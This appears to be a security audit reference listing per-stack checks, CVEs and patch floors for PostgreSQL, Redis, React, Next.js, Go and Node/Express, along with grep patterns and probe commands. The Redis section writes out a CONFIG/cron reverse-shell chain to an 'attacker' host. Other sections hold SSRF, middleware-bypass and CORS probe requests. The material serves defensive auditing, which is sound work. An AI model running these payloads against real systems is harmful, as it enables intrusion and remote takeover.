# Stack-Specific Checks

Concrete checks for the stacks that appear most often. Run the section matching what
Phase 0 detected. Version floors move — treat every floor here as a lower bound and
confirm against the vendor advisory when a version is close to the line.

## Contents
- [Run these first](#run-these-first)
- [PostgreSQL](#postgresql)
- [Redis](#redis)
- [React](#react)
- [Next.js](#nextjs)
- [Go](#go)
- [Node.js and Express](#nodejs-and-express)
- [Two architectural findings](#two-architectural-findings)

## Run these first

Two CVSS 10.0 issues outrank everything else in this file.

**React2Shell — CVE-2025-55182 / CVE-2025-66478.** Unauthenticated RCE through
deserialization of React Server Function payloads, exploited in the wild. There is no
workaround; upgrading is the only fix, and **if the app was online and unpatched after
2025-12-04, secrets must be rotated** — treat them as disclosed.

```bash
npm ls react-server-dom-webpack react-server-dom-parcel react-server-dom-turbopack
npx fix-react2shell-next          # official checker and version bumper
```

Affected React packages at 19.0, 19.1.0, 19.1.1, 19.2.0 (patched 19.0.1, 19.1.2,
19.2.1). Next.js 15.x, 16.x and 14.3.0-canary.77+ (patched 15.0.5, 15.1.9, 15.2.6,
15.3.6, 15.4.8, 15.5.7, 16.0.7). Next.js 13.x, stable 14.x, Pages Router and Edge
Runtime are unaffected.

Two follow-ups found while auditing that patch, so a single upgrade may be insufficient:
**CVE-2025-55184 / CVE-2025-67779** (DoS, first fix incomplete) and **CVE-2025-55183**
(a crafted request returns the compiled source of other Server Functions, leaking
anything hardcoded in source).

**RediShell — CVE-2025-49844.** A 13-year-old use-after-free in the Lua interpreter;
a crafted `EVAL` escapes the sandbox to native RCE. Nominally post-auth, but Redis
ships with no authentication and the official Docker image disables protected mode, so
in practice it is frequently pre-auth.

## PostgreSQL

Patch floor (Feb 2026): 18.2 / 17.8 / 16.12 / 15.16 / 14.21. That batch fixed
CVE-2026-2005 (pgcrypto heap overflow to RCE as the postgres OS user) and CVE-2026-2006
(multibyte validation overrun to RCE for any authenticated user) — which is what makes
the superuser check below urgent rather than theoretical.

**`trust` authentication.** Any matching client authenticates as any role, without a
password. Every local-setup tutorial starts here and it gets copied to servers.

```sql
SELECT line_number, type, database, user_name, address, auth_method
FROM pg_hba_file_rules WHERE auth_method IN ('trust','password','ident','md5');
```

```bash
rg -n 'POSTGRES_HOST_AUTH_METHOD\s*[:=]\s*trust' -g '*.yml' -g '*.yaml' -g 'Dockerfile*'
```

**App connecting as superuser.** Turns any SQL injection into host compromise via
`COPY ... FROM PROGRAM`, and `rolbypassrls` silently voids every RLS policy.

```sql
SELECT rolname, rolsuper, rolbypassrls, rolcreaterole, rolcreatedb
FROM pg_roles WHERE rolcanlogin AND (rolsuper OR rolbypassrls OR rolcreaterole);
```

**Missing TLS.** libpq defaults to `sslmode=prefer`, which silently falls back to
plaintext and gives no MITM protection. `require` encrypts but does not authenticate the
server; only `verify-full` does both.

```bash
rg -n 'sslmode=(disable|allow|prefer)'
rg -n 'rejectUnauthorized\s*:\s*false'      # node-postgres, very common
```

**The PG15 public-schema trap.** PG15 revoked `CREATE` on `public` from `PUBLIC`, but
`pg_dump` and `pg_upgrade` preserve the old permissive ACL. An upgraded cluster looks
modern and is still open, which enables the CVE-2018-1058 search_path attack.

```sql
SELECT has_schema_privilege('public','public','CREATE') AS public_can_create;
-- true is the finding
ALTER SCHEMA public OWNER TO pg_database_owner;
REVOKE CREATE ON SCHEMA public FROM PUBLIC;
```

**SECURITY DEFINER without a pinned search_path.** Every row returned is a privilege
escalation path to the function owner, often `postgres`.

```sql
SELECT n.nspname, p.proname, pg_get_userbyid(p.proowner) AS owner
FROM pg_proc p JOIN pg_namespace n ON n.oid = p.pronamespace
WHERE p.prosecdef AND n.nspname NOT IN ('pg_catalog','information_schema')
  AND (p.proconfig IS NULL OR NOT EXISTS (
       SELECT 1 FROM unnest(p.proconfig) c WHERE c LIKE 'search_path=%'));
```

Fix with `ALTER FUNCTION f() SET search_path = pg_catalog, pg_temp;` — include
`pg_temp` last or you leave a temp-table shadowing vector.

**Also check:** `listen_addresses = '*'` combined with a published `5432:5432` port;
`statement_timeout` and `idle_in_transaction_session_timeout` left at `0`;
`password_encryption` still `md5` on clusters upgraded from 13 or earlier; and RLS on
multi-tenant tables (`relforcerowsecurity` matters separately — without `FORCE` the
table owner bypasses policies).

## Redis

Patch floor (July 2026): 6.2.23 / 7.2.15 / 7.4.10 / 8.2.8 / 8.4.5 / 8.6.5 / 8.8.1.
Redis has had three RCE waves in twelve months — the October 2025 Lua cluster
(CVE-2025-49844, 46817, 46818, 46819) and the May 2026 batch (CVE-2026-23479 in
unblock-client, CVE-2026-25243 in `RESTORE`).

**The single highest-value check in this file** is an unauthenticated ping from off the
host:

```bash
redis-cli -h <host> -p 6379 PING     # PONG means unauthenticated. NOAUTH is what you want.
```

Three causes compound here: Redis has no authentication by default, the official Docker
image disables protected mode so containers can reach each other, and `bind 0.0.0.0` is
the usual answer to a connection-refused error. Cryptomining botnets scan port 6379
continuously.

```bash
rg -n '^\s*bind\s+.*(0\.0\.0\.0|\*)' -g 'redis.conf'
rg -n '^\s*protected-mode\s+no' -g 'redis.conf'
rg -n 'ALLOW_EMPTY_PASSWORD\s*[:=]\s*["\x27]?yes' -g '*.yml' -g '*.yaml'
redis-cli CONFIG GET requirepass     # empty value is the finding
redis-cli ACL LIST                   # "default on nopass ~* &* +@all" is wide open
```

**Protected mode is not authentication.** It only refuses non-loopback connections when
no password *and* no explicit bind are set. Setting `bind 0.0.0.0` disables its
protection while leaving `protected-mode yes` in the config, which reads as safe and is
not.

**The classic RCE chain.** With `CONFIG` reachable, an attacker writes an arbitrary file
as the Redis OS user:

```
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker/443 0>&1\n\n"
SAVE
```

Variants use `MODULE LOAD` directly, or `REPLICAOF` pointed at a rogue master that ships
a module over the replication stream. Check whether `CONFIG`, `MODULE` and `DEBUG` are
reachable, and whether Redis runs as root (`ps -o user= -C redis-server`).

Prefer ACL users over `rename-command`, which is legacy and leaks through the config:

```
ACL SETUSER default off
ACL SETUSER appuser on >PASS ~app:* +@read +@write -@admin -@dangerous -@scripting
```

## React

**Secrets in the built bundle.** Any variable with a public prefix (`REACT_APP_`,
`VITE_`, `NEXT_PUBLIC_`, `GATSBY_`, `EXPO_PUBLIC_`) is substituted into the bundle at
build time. Scan the built output, not just source — that is what removes false
positives and catches indirect leaks.

```bash
npm run build
rg -n 'sk-[A-Za-z0-9]{20,}|sk_live_|AKIA[0-9A-Z]{16}|service_role' dist build .next/static -g '*.js'
```

**`dangerouslySetInnerHTML`** with a non-literal value, and no sanitizer in the same
module:

```bash
rg -n 'dangerouslySetInnerHTML' -g '*.{js,jsx,ts,tsx}' -g '!node_modules'
rg -l 'DOMPurify|sanitize-html' -g '*.{js,jsx,ts,tsx}'    # absence is the finding
```

**Markdown that re-enables raw HTML.** `react-markdown` is safe until `rehype-raw` is
added; `marked` and `markdown-it` with `html: true` emit raw HTML by design.

```bash
rg -n 'rehype-raw|rehypeRaw|allowDangerousHtml' -g '*.{js,jsx,ts,tsx}'
```

**Client-side-only auth checks.** A hidden button is not authorization. Each hit here is
a lead requiring confirmation that the corresponding server route authorizes — the
decisive test is a curl with a low-privilege token, bypassing the UI entirely.

**Source maps in production** reconstruct original source, comments and internal routes:

```bash
curl -sI https://target/static/js/main.abc123.js.map | head -1
```

Also check `javascript:`/`data:` URLs reaching `href`, and `postMessage` listeners with
no `event.origin` check.

## Next.js

Version policy: 16.2.x is Active LTS, 15.5.x is Maintenance LTS. **13.x and 14.x no
longer receive security patches.** Current floor: **16.2.11 or 15.5.21**.

**This is the check most audits get wrong.** Only `>= 15.5.21` or `>= 16.2.11` carry
*all* patches. Versions like 15.4.10, 15.3.8 and 15.0.7 received the December 2025
React2Shell fixes but **not** the May 2026 or July 2026 ones. Those release lines are
permanently vulnerable — they must be **moved to a supported line, not bumped within
their own**. A repo on 15.4.10 looks patched against React2Shell and is still exposed
to four later high-severity issues including two more middleware bypasses.

```bash
node -p "require('next/package.json').version"
```

Sitting between the December fix and the current floor also means the app may have been
exploitable during the React2Shell window, so apply the secret-rotation rule above.

Beyond the React2Shell chain above, the July 2026 batch fixed nine issues. Two matter
most: **CVE-2026-64642**, a middleware bypass affecting App Router built with Turbopack
where `config.i18n.locales` has exactly one entry, and **CVE-2026-64645**, SSRF and open
redirect where a `rewrites()` destination hostname derives from request input.

**CVE-2025-29927** is the older middleware bypass — sending
`x-middleware-subrequest` skips middleware entirely:

```bash
curl -sI https://target/protected -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
# 200 instead of 302/401 means vulnerable
```

**Server Actions are public HTTP endpoints.** Every `"use server"` function is callable
directly with a crafted POST. It looks like a local function call at the call site,
which is exactly why the auth check gets omitted — and CVE-2026-64643 hands attackers
the endpoint IDs. This is the most common serious App Router flaw.

```bash
rg -l '^\s*["\x27]use server["\x27]' -g '*.{ts,tsx,js,jsx}'
# enumerate live action IDs from the shipped bundle
rg -o --pcre2 'createServerReference\(\s*["\x27][0-9a-f]{40}' -g '*.js' .next/static/
```

**Do not grep for the word "auth" to decide whether a handler is protected.** A file
containing `// TODO: add auth check` passes a keyword search while having no auth at
all, and that comment is exactly what AI scaffolding emits. Require auth as a *call or
import*, and check per function rather than per file — one guarded action masks
unguarded siblings:

```bash
rg -l 'export\s+(?:async\s+function|const)\s+(?:GET|POST|PUT|PATCH|DELETE)' -g 'route.{ts,js}' . |
while read -r f; do
  rg -q --pcre2 '(?:await\s+)?(?:auth|getServerSession|currentUser|getSession|requireUser|verifySession|getToken|getAuth)\s*\(|from\s+["\x27](?:next-auth|@clerk/|@auth/|@supabase/auth)' "$f" || echo "NO-AUTH: $f"
done
```

Every action body needs authentication *and* object-level authorization, the same as a
route handler.

**Also check `ignoreBuildErrors` and `ignoreDuringBuilds`**, which are near-universal in
AI-scaffolded repos and silently remove the type and lint errors that would have caught
several of the classes above:

```bash
rg -n --pcre2 '(?:ignoreBuildErrors|ignoreDuringBuilds)\s*:\s*true' -g 'next.config.*'
```

**Server-to-client boundary leaks.** Passing a whole database row to a Client Component
serializes every field into the RSC payload in the HTML, including `passwordHash`,
regardless of what renders. The authoritative check is the served response:

```bash
curl -s https://target/page | rg -o 'passwordHash|password_hash|stripeCustomerId|sk_live'
```

Fix with `import 'server-only'` in server modules and explicit field projection instead
of spreading a record across the boundary.

**Image optimization SSRF.** A wildcard `remotePatterns` hostname makes `/_next/image`
an open proxy:

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  'https://target/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75'
```

## Go

Run both tools; they do not overlap. `govulncheck` asks whether a known-vulnerable
function is actually reachable from your code, which suppresses most CVE-list noise and
makes its findings actionable by default. `gosec` asks whether your own code contains a
risky pattern, and needs tuning.

```bash
govulncheck ./...
gosec -fmt=sarif -out=gosec.sarif -exclude-generated ./...
```

**G402, `InsecureSkipVerify: true`** — disables certificate verification entirely, so
the connection is encrypted but unauthenticated. Added to silence a self-signed-cert
error in staging and merged. The most damaging Go pattern in practice.

**SQL built with `fmt.Sprintf`** — `database/sql` supports placeholders; dynamic filters
and sort orders are what push people to string building.

```bash
rg -n '(Query|QueryRow|Exec)\w*\(\s*(ctx\s*,\s*)?fmt\.Sprintf' --type go
```

**Missing `http.Server` timeouts.** `http.ListenAndServe(":8080", h)` builds a
zero-value server where every timeout is infinite — a few hundred slow connections
exhaust it. `ReadHeaderTimeout` is the specific Slowloris defence.

```bash
rg -n 'http\.ListenAndServe\(' --type go
rg -n 'ReadHeaderTimeout|ReadTimeout|WriteTimeout' --type go   # absence is the finding
```

**G304 path traversal.** `filepath.Join` calls `Clean`, which *resolves* `..` — it does
not confine the result to the base directory. It looks like a sandbox and is not. Go
1.24's `os.OpenRoot` is traversal-proof by construction; use it rather than hand-rolling
containment checks.

**G404, `math/rand` for security values.** Go 1.20+ auto-seeds, which removed the
obvious "same token every restart" symptom while leaving the values fully predictable.

```bash
rg -l '"math/rand' --type go | xargs rg -ln 'token|secret|key|session|otp|nonce' -i
```

## Node.js and Express

Runtime floor: Node 22.23.0 / 24.17.0 / 26.3.1. **Node 18 and 20 are EOL.**

**CORS with a reflected origin and credentials.** The lethal combination is
`origin: true` (which *reflects* the request Origin) together with `credentials: true`.
Unlike `origin: '*'`, the browser does not block this, so any site can make
authenticated cross-origin requests and read the responses.

```bash
curl -sI https://target/api/me -H 'Origin: https://evil.com' \
  | rg -i 'access-control-allow-(origin|credentials)'
```

Reflecting `https://evil.com` alongside `allow-credentials: true` is the finding.

**No rate limiting on auth endpoints:**

```bash
for i in $(seq 1 30); do curl -s -o /dev/null -w '%{http_code} ' \
  -X POST https://target/api/login -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}'; done
# thirty 401s and no 429 is the finding
```

Behind a proxy this needs `app.set('trust proxy', 1)`, or every request shares the
proxy's IP. Do not set `trust proxy: true` blindly — that lets clients spoof
`X-Forwarded-For` and bypass the limiter entirely.

**express-session defaults.** The default `MemoryStore` is documented as unsuitable for
production, leaks memory, and silently breaks auth across workers. Check `httpOnly`,
`secure`, `sameSite`, `saveUninitialized: false`, a store, and a secret with no literal
fallback:

```bash
rg -n 'secret\s*:\s*process\.env\.\w+\s*\|\|\s*["\x27]' --type js --type ts
```

Session fixation is not handled for you: call `req.session.regenerate()` on login.

**JWT verification.** Three distinct bugs, all common — `jwt.decode()` used where
`verify()` was meant (no signature check at all), `verify()` without an `algorithms`
option (algorithm confusion), and a weak or hardcoded secret.

```bash
rg -n 'jwt\.decode\(' --type js --type ts
rg -n 'jwt\.verify\((?:(?!algorithms).){0,200}\)' -P --type js --type ts
```

**Prototype pollution.** A recursive merge of attacker JSON writes to
`Object.prototype`. `body-parser`'s `extended: true` default uses `qs`, which parses the
deeply nested structures that deliver it.

```bash
rg -n '(_\.|lodash\.)(merge|mergeWith|defaultsDeep)\(' --type js --type ts
rg -n 'Object\.assign\(\s*(\{\}\s*,\s*)?req\.(body|query)' --type js --type ts
```

**`child_process` with user input.** `exec` spawns a shell, so any interpolated value is
command injection. Lower frequency than the rest, essentially always critical when
present. Fix with `execFile` and an argument array.

Also check: missing `helmet`, `res.sendFile` without a `root` option, `express.static`
serving the project root (exposing `.env` and `.git/`), and JWTs in `localStorage`.

## Two architectural findings

Raise these regardless of version number, because patching does not address them.

**Authorization enforced only in Next.js middleware.** Middleware has now been bypassed
by **five separate CVEs**: CVE-2025-29927, CVE-2026-44575, CVE-2026-45109 (an
incomplete fix for the previous one), CVE-2026-64642, and the May 2026 Pages Router
i18n bypass. That is a structurally fragile control, not a one-time bug. Authorization
belongs in the route handler, Server Action, or data layer, with middleware doing
redirects and coarse routing only. Flag the architecture, not just the version.

**`filepath.Join` and `path.join` treated as a sandbox.** In both Go and Node they
resolve `..` and confine nothing. The real fixes are Go 1.24's `os.OpenRoot` and
Express's `sendFile` `root` option.
